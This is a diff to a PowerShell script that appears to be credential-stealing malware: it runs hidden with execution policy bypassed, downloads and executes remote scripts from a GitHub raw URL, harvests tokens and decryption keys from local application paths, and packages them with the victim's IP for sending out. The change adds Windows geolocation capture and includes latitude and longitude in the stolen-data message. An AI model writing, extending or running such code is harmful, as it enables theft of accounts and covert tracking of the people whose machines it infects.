@@ -1,6 +1,6 @@
 #Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
 powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (IWR 'https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/seco.ps1' -UseBasicParsing)"
-
+Add-Type -AssemblyName System.Device
 Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.Drawing,System.Windows.Forms
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
@@ -108,18 +108,18 @@ foreach ($platform in $PATHS.Keys) {
     foreach ($token in $tokens) {
         $token = $token -replace '\\', ''
 
+        $elapsed = 0
 
-
-
-
-
-
-
-
-
-
-
-
+        while ($watcher.Position.Location.IsUnknown -and $elapsed -lt $timeout) {
+            Start-Sleep -Seconds 1
+            $elapsed++
+        }
+        
+        if ($watcher.Position.Location.IsUnknown) {
+            Write-Host "Could not get location. Make sure Windows Location Services are enabled."
+        } else {
+            $loc = $watcher.Position.Location
+        }
 
         try {
             $key = Get-Key -path $path
@@ -129,8 +129,8 @@ foreach ($platform in $PATHS.Keys) {
             $message = @"
 {key: "$key",
 token: "$token",
-ip: "$ip"}
-
+ip: "$ip",
+loc: ["$loc.Latitude","$loc.Longitude","$loc.HorizontalAccuracy"]}
 "@
 
             $payload = @{
